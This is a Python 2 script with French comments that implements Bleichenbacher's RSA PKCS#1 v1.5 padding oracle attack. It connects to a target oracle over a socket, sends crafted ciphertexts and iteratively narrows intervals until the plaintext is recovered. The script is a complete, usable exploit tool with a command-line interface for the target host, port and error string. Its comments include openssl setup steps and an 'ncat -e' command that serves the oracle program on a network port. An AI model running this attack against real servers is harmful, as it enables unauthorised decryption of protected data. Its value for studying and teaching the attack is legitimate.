#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

# RSA Padding Oracle Attack
# Zweisamkeit - zweisamkeit.fr
# 03/12/16
# GNU GPL v3
# http://archiv.infsec.ethz.ch/education/fs08/secsem/Bleichenbacher98.pdf 
# https://www.baigneres.net/downloads/2002_pkcs.pdf

import socket
import random
import sys
import argparse

# Accueil

print "\n"
print "\t~~~~~~~~~~~~~~~~~~~~~~~~~"
print "\t  Bleichenbacher Attack  "
print "\t       Zweisamkeit       "
print "\t    GNU GPL v3 License   "
print "\t~~~~~~~~~~~~~~~~~~~~~~~~~"
print "\n"

# Augmente nombre appels recursifs

sys.setrecursionlimit(10000)

# Premier entier inférieur ou égal / supérieur ou égal à  x/y

def Defaut(x,y):
  return x / y

def Exces(x,y):
  return Defaut(x,y) + (x % y != 0)

# Génération des clés :

  # openssl genrsa 2048 > private.key
  # openssl rsa -pubout < private.key > public.key 2 > /dev/null

# Chiffrement du message :

  # echo -en "Je suis Zweisamkeit" | openssl rsautl -encrypt -inkey private.key | xxd -ps | tr -d '\n' > cryptogramme.txt

# Déchiffrement du message :

  # cat cryptogramme.txt | xxd -r -p | openssl rsautl -decrypt -inkey private.key

# Module : openssl rsa -pubin -in public.key -modulus 2>/dev/null | grep Modulus | cut -d '=' -f 2

# Exposant publique openssl rsa -in public.key -pubin -text -noout | grep Exponent | cut -d ' ' -f 2

# Message chiffré cryptogramme.txt

# Oracle ncat -lvp 4444 -e ./oracle --keep-open

parser = argparse.ArgumentParser(description='This program allows to carry out a Bleichenbacher Attack')
parser.add_argument('-n', dest='n',type=int,help='RSA public key modulus',required=True)
parser.add_argument('-e', dest='e',type=int,help='RSA public key exponent',required=True)
parser.add_argument('-c', dest='c',type=int,help='cipher text',required=True)
parser.add_argument('--host', dest='host',type=str,help='hostname',required=True)
parser.add_argument('-p', dest='port',type=int,help='port',required=True)
parser.add_argument('--error', dest='error',type=str,help='error padding message',required=True)

args=parser.parse_args()

n=args.n
e=args.e
c=args.c
host=args.host
port=args.port
error=args.error

print n,e,c,host,port,error

print "\tConnection to Oracle..."

server=(host,port)

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(server)

print "\tConnection established\n"

# Appel à Oracle qui va déchiffrer le cryptogramme et indiquer si le padding est valide ou non

def Oracle(y):
  cryptogramme = bytearray.fromhex('{:0512x}'.format(y))
  sock.send(cryptogramme)
  reponse = sock.recv(1024)
  return (reponse.find(error) == -1)

# Recherche de si dans le cas où l'on a plusieurs encadrements

def Recherche(init):
  si=init
  while True:
    c1 = (c0 * (pow(si,e,n))) % n  # Exponentiation modulaire permettant d'optimiser fortement les calculs
    if (Oracle(c1)):
      break # On a trouvé le bon si
    si += 1
  return si

# Recherche optimisée de si dans le cas où l'on n'a qu'un seul encadrement

def Recherche_Binaire(si,a,b):
  r = Exces((b*si - B2)*2,n) # Valeur initiale de r
  found = False
  while not found:
    for si in range(Exces((B2 + r * n),b),Exces((B3-1 + r * n),a)+1):
      ci = (c0 * (pow(si,e,n))) % n
      if Oracle(ci):
        found = True
        break # On a trouvé si
    if not found:
      r  += 1
  return si

# Calcul et affinage des intervalles

def Affinage(si,a,b):
  M = set([]) # Contiendra nouveaux intervalles de m0
  for r in range(Exces((a*si - B3 + 1),n),Defaut((b*si - B2),n) + 1):
    newa = max(a,Exces(B2 + r*n,si)) # Nouvel intervalle de m0
    newb = min(b,Defaut(B3 - 1 + r*n, si))  
    if newa <= newb:
      M |= set([(newa, newb)])
  return M

# Pour déterminer le plaintext à partir de la borne 

# Coefficients de Bézout

def Bezout(a, b):
    if a == 0 and b == 0:
      return (0, 0, 0)
    if b == 0:
      return (a/abs(a), 0, abs(a))
    (u, v, p) = Bezout(b, a%b)
    return (v, (u - v*(a/b)), p)
 
# Inverse modulaire

def Inv_mod(x, m):
    (u, _, p) = Bezout(x, m)
    return u % abs(m)

# Initialisation 

# Blinding - Étape 1

print "\tAttack launch...\n"

print "\tBinding launch..."

maximum=10**10 # Valeur arbitraire
s0 = random.randint(1,maximum)
c0 = (c * (pow(s0,e,n))) % n

while not Oracle(c0):
  s0 = random.randint(1,maximum) # Cherche un s0 random tel que c0 soit conforme
  c0 = (c * (pow(s0,e,n))) % n

print "\tBinding done.\n"
#print "s0 random utilisé : ", s0

k = 256 # Taille du module en bytes
B = 2**(8*(k-2)) # B
B2 = 2*B
B3 = 3*B

M = set([]) # Liste d'encarements initiale
M |= set([B2, B3-1])

# Initialisation - Étape 2.a

print "\tConstruction and narrowing the sets..."

si = Exces(n,3*B) # On initialise si
si = Recherche(si) # On cherche le premier si valable
#print "si initial trouvé : ",si
M = Affinage(si,B2,B3-1)
#print "M initial trouvé : ", M # Étape 3

# Iterations

def Iteration(si,M):
  if (len(M) > 1): # S'il y a plusieurs intervalles encadrant le plaintext, on itère sur chaque intervalle - Étape 2.b
    si=Recherche(si+1) # En partant de si = si +1
    #print "Nouveau si : ",si
    tmpM = set([])
    for (a,b) in M:
      tmpM.update(Affinage(si,a,b)) # Affinage de l'intervalle courante - Étape 3
      M=Iteration(si,tmpM)
    #print "Nouveau M : ",M
    Iteration(si,M)
  elif (len(M) == 1) : # S'il n'y a qu'un seul intervalle encadrant le plaintext # Étape 4
    (a,b)=(list(M)[0][0],list(M)[0][1])
    if (a==b): # Si l'amplitude de l'unique intervalle est nulle, on a le plaintext
      print "\tConstruction and narrowing the sets done.\n"
      plaintext = (a * Inv_mod(s0,n)) % n
      print "\tThe plaintext is: \n\n", hex(plaintext)[3:].replace('L','').decode('hex') # Renvoie le plaintext
      print "\n\tAttack done.\n"
      sock.close()
      print "\tConnection closed.\n"
      exit()
    else : # Si l'on n'a qu'un intervalle d'amplitude non nulle, on utilise l'optimisation binaire pour trouver si plus rapidement # Étape 2.c
      si = Recherche_Binaire(si,a,b) # On recherche le prochain si de manière optimisée
      #print "si optimisé trouvé : ",si
      M=Affinage(si,a,b) # On détermine la liste d'intervalles encadrant le plaintext correspondant - Étape 3
      #print "Intervalle unique : ",M
      Iteration(si,M) # On réitère sur cette liste

# Appel

Iteration(si,M)

# Déroulement global de l'attaque :

# Je choisis aléatoirement des s0 jusqu'à  ce que c0 = c * (s0 ** e) % n soit conforme, avec c le cryptogramme, e l'exposant publique et n le module.
# Je cherche le premier si >= n/3B tel que c0 * (si ** e) % n soit conforme.
# Je construis le premier intervalle M de la manière suivante :
  # Pour r allant de Exces((B2*si - B3 + 1),n) à  Defaut((B3*si - B2),n) + 1), je pose newa = max(B2, Exces(B2 + r*n,si)) et newb = min (B3, Defaut(B3 - 1 + r*n, si))
  # Si newa <= newb, on l'intège à  notre nouvelle liste d'intervalles
# Si len(M) > 1, je cherche le prochain si tel que 0 * (si ** e) % n, puis j'affine chaque intervalle (a,b) de M afin de réduire cette liste, dans le but final qu'il n'en reste qu'un :
  # Pour r allant de Exces((a*si - B3 + 1),n) à  Defaut((b*si - B2),n) + 1), je pose newa = max(a, Exces(B2 + r*n,si)) et newb = min (b, Defaut(B3 - 1 + r*n, si))
  # Si newa <= newb, on l'intège à  notre nouvelle liste d'intervalles (si newa > newb, on perd l'intervalle ce qui permettra de n'en avoir qu'un seule au final)
# Si, au contraire, len(M) = 1, je distingue deux cas :
  # Soit les bornes de l'intervalle sont distinctes, et alors on utilise la recherche binaire optimisée pour trouver le prochain si et affiner cet unique intervalle.
  # Soit les bornes de l'intervalle sont égales, et alors on renvoie le plaintext a * Inv_mod(s0,n) % n, a étant l'une de ces bornes.
